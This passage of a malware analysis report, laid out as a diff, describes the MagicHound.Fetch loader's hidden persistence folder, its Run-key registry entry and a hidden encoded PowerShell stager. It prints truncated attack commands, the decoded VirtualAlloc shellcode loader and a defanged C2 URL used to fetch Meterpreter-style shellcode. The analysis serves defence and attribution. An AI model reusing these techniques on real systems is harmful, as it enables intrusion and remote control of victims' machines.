@@ -1,0 +1,31 @@
+MAGICHOUND.FETCH
+The custom loader Trojan used by this group, which we call MagicHound.Fetch is responsible for
+setting up persistent access to the system and to reach out to a remote server to download and
+execute a secondary payload. To set up persistence, the loader creates a folder named “c:\temp”,
+sets its attributes to be a hidden and system folder to hide the folder from view in Windows Explorer.
+It then writes a file named “rr.exe” (SHA256:�
+f439dee4210d623b5aa7491bad8e8d9b43305f25a5d26940eb36f6460215cf8e) to this folder and
+executes it with specific command line arguments. During our analysis, we observed one loader�
+running “rr.exe” with the following arguments:
+1 open cmd.exe /c c:\temp\rr.exe SOFTWARE\Microsoft\Windows\CurrentVersion\Run "C:\DOCUME~1\AD
+The “rr.exe” payload dropped to the system does nothing more than use the supplied command line
+arguments to create a registry key to execute the payload each time the system starts. In the
+example above, the “spp.exe” executable would be added to an auto-run registry key at:
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run\iexplore
+Many of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded
+strings with AES using the same key “agkrhfpdbvhdhrkj”; however, the loader’s main goal involved
+running the following command:
+1 /c powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEA
+The base64 encoded command decodes to the following:
+1 $0o8e = '$f9B = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAd
+The decoded command above builds a buffer that it uses to store shellcode and creates a thread to�
+execute it. We found the command above within the source code of Magic Unicorn, which was also
+used in the Magic Hound delivery documents. The shellcode executed by this command is the same
+as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode�
+to execute using an HTTP request to the following URL:
+http://www7.chrome-up[.]date/0m5EE
+We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to
+provide a payload. However, as alluded to above, we believe that this adversary used the open
+source Magic Unicorn tool to load a shellcode-based payload. The fact that the actor used
+Metasploit shellcode within the Unicorn generated PowerShell script leads us to speculate that the
+ultimate payload of this attack is Meterpreter, which is a shellcode-based payload.
